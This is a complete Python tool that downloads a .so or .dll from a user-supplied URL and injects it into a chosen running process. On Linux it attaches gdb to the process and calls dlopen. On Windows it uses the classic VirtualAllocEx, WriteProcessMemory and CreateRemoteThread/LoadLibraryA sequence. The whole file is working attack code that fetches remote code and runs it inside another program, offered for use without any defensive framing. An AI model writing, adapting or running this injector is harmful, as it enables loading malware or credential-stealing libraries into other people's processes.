import sys
import os
import argparse
import tempfile
import urllib.request
import subprocess

def download_lib(url, dest_path):
    urllib.request.urlretrieve(url, dest_path)
    print(f"[+] Downloaded library to {dest_path}")

def inject_linux(lib_path, pid):
    # RTLD_NOW = 2
    gdb_cmd = [
        "gdb", "-q", "--batch",
        "-p", str(pid),
        "-ex", f'call (void*)dlopen("{lib_path}", 2)',
        "-ex", "detach",
        "-ex", "quit"
    ]
    subprocess.check_call(gdb_cmd)
    print(f"[+] Injected {lib_path} into PID {pid} via gdb/dlopen")

def inject_windows(lib_path, pid):
    import ctypes
    from ctypes import wintypes

    kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)

    PROCESS_ALL_ACCESS = 0x1F0FFF
    MEM_COMMIT  = 0x1000
    MEM_RESERVE = 0x2000
    PAGE_READWRITE = 0x04
    hproc = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
    if not hproc:
        raise ctypes.WinError(ctypes.get_last_error(), "OpenProcess failed")
    path_bytes = lib_path.encode("ascii") + b"\x00"
    size = len(path_bytes)
    addr = kernel32.VirtualAllocEx(hproc, None, size,
                                   MEM_COMMIT | MEM_RESERVE,
                                   PAGE_READWRITE)
    if not addr:
        raise ctypes.WinError(ctypes.get_last_error(), "VirtualAllocEx failed")
    written = wintypes.SIZE_T(0)
    if not kernel32.WriteProcessMemory(hproc, addr,
                                       path_bytes,
                                       size,
                                       ctypes.byref(written)):
        raise ctypes.WinError(ctypes.get_last_error(), "WriteProcessMemory failed")
    h_kernel32 = kernel32.GetModuleHandleA(b"kernel32.dll")
    load_addr = kernel32.GetProcAddress(h_kernel32, b"LoadLibraryA")
    if not load_addr:
        raise ctypes.WinError(ctypes.get_last_error(), "GetProcAddress failed")
    thread_id = wintypes.DWORD(0)
    hthread = kernel32.CreateRemoteThread(hproc, None, 0,
                                          load_addr, addr, 0,
                                          ctypes.byref(thread_id))
    if not hthread:
        raise ctypes.WinError(ctypes.get_last_error(), "CreateRemoteThread failed")

    print(f"[+] Injected {lib_path} into PID {pid} via CreateRemoteThread (TID={thread_id.value})")

def main():
    parser = argparse.ArgumentParser(description="Inject libptt into a process")
    parser.add_argument("url", help="URL of .so (Linux) or .dll (Windows)")
    parser.add_argument("pid", type=int, help="Target process ID")
    args = parser.parse_args()

    tmpdir = tempfile.gettempdir()
    lib_name = os.path.basename(args.url)
    lib_path = os.path.join(tmpdir, lib_name)

    download_lib(args.url, lib_path)

    if sys.platform.startswith("linux"):
        inject_linux(lib_path, args.pid)
    elif sys.platform.startswith("win"):
        inject_windows(lib_path, args.pid)
    else:
        sys.exit(f"Unsupported platform: {sys.platform}")

if __name__ == "__main__":
    main()
